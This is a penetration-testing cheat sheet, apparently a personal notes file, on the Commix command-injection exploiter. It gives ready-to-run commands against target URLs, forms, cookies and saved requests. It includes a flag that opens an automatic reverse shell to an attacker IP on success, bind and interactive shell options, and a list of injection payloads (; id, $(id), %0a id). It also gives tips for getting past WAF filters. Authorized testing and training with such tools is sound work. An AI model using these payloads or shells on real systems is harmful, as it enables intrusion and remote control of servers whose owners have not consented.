---
tags: [pentest, commix, command-injection, web, initial-access]
tool: commix
phase: 5
---
# Commix

Automated command injection scanner/exploiter. The "sqlmap for cmd injection."

[[06 - Gaining Access/00 - README|Folder index]]

## Basic

```bash
# GET parameter
commix --url="https://target/ping?host=8.8.8.8"

# POST data
commix --url="https://target/ping" --data="host=8.8.8.8"

# Cookies
commix --url="..." --cookie="PHPSESSID=abc"

# Specify which param
commix --url="..." --data="user=test&host=8.8.8.8" -p host

# With Burp request
commix --request=req.txt
```

## Useful flags

```bash
--all                  # try every technique
--level=3              # 1-3, more aggressive
--technique="cefr"     # c=classic e=eval-based f=file-based r=referer t=time-based
--os=unix              # narrow detection
--tamper=base64encode
--ssrf                 # via SSRF chain
```

## Output options

```bash
--reverse-tcp 10.10.14.5 4444    # auto reverse shell on success
--bind-tcp 4444                  # bind shell
--os-cmd="whoami"                # one-shot command
--os-shell                       # interactive shell
```

## Manual payloads to test first

```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id            # url-encoded newline
%0d%0a id
```

Try each on every URL/form param that looks like it ends up in a system call.

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `Heuristic detection failed` | Increase `--level`, try `--technique=t` (time-based blind). |
| All techniques fail | Param probably not a command injection point. Look elsewhere. |
| WAF blocks `;` and `|` | Try `%0a` (LF), backticks, `$(...)`. |

> [!tip] commix excels at "ping" / "lookup" forms
> Anything where the app shells out to nslookup, ping, traceroute, dig, host - commix usually finds an injection in seconds.
